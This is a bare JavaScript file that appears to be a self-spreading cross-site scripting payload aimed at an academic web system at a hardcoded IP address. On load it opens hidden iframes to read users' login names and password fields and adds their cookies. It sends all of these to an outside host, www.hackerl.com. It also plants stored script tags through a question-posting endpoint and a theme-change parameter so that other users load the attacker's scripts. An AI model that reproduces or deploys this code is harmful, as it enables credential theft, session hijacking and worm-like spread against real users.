function post_cookie(data){
    var head = document.getElementsByTagName("head")[0];
    var js_cookie = document.createElement("script");
    var str="http://www.hackerl.com/about.js?"+data;
    js_cookie.src=str;
    js_cookie.type = 'text/javascript';
    js_cookie.language="javascript";
    head.appendChild(js_cookie);
    }


function get_data(){
    get_password();
    var i="name=";
    setTimeout(function () {
		var password=document.getElementById("grsz_xgmm").contentWindow.document.getElementById('oldpassword').value
		if(password==""){
		    password=document.getElementById("login").contentWindow.document.getElementById('userPassword').value
		}
		i=i+document.getElementById("ysgg_query").contentWindow.document.getElementById("Top1_divLoginName").innerHTML+"&password="+password+"&cookie="+document.cookie;
		post_cookie(i);
	}, 1000);
	
}


function inj_iframe(src,id){
    var o = document.createElement("iframe");
    o.src=src;
    o.width=0;
    o.height=0;
    o.id=id;
    document.getElementsByTagName("body")[0].appendChild(o);
    return o;    
}


function get_password(){
    inj_iframe("http://218.64.56.18/jsxsd/grsz/grsz_xgmm","grsz_xgmm");
    inj_iframe("http://218.64.56.18/jsxsd/ggly/ysgg_query","ysgg_query");
    inj_iframe("http://218.64.56.18/jsxsd/","login");    
    return 0;
}


function creat(){
    setTimeout(function () {
    var request;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest();
    } else {
        request = new ActiveXObject('Microsoft.XMLHTTP');
    }

    request.open("POST","http://218.64.56.18/jsxsd/zxwd/tw_add_save",true);
    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    request.send("xmms=游戏参与者："+document.getElementById("ysgg_query").contentWindow.document.getElementById("Top1_divLoginName").innerHTML+"<script language=\"javascript\" src=\"http://www.hackerl.com/static/js/joke.js\" type=\"text/javascript\"></script><script language=\"javascript\" src=\"http://www.hackerl.com/static/js/about.js\" type=\"text/javascript\"></script>");
	}, 1000);
}


function check(){
    var request;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest();
    } else {
        request = new ActiveXObject('Microsoft.XMLHTTP');
    }


    request.onreadystatechange = function () {
    if (request.readyState === 4) { 
        if (request.status === 200) {
            if(request.responseText.indexOf("游戏参与者")==-1){creat();}
        } else {
            return 0;
        }
    } else {
    }
}
    request.open('GET', '/jsxsd/zxwd/zxwd_opt');
    request.send();
}
function theme(){
    setTimeout(function () {
    var request;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest();
    } else {
        request = new ActiveXObject('Microsoft.XMLHTTP');
    }
    request.open("POST","http://218.64.56.18/jsxsd/system/changeTheme.do",true);
    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    request.send("changeTheme=blue.css\"><script language=\"javascript\" src=\"http://www.hackerl.com/static/js/hackerl.js\" type=\"text/javascript\"></script> <link id=\"link_theme\" type=\"text/css\" rel=\"stylesheet\" href=\"/jsxsd/framework/images/blue");
    }, 1000);
}
theme();
get_data();
check();
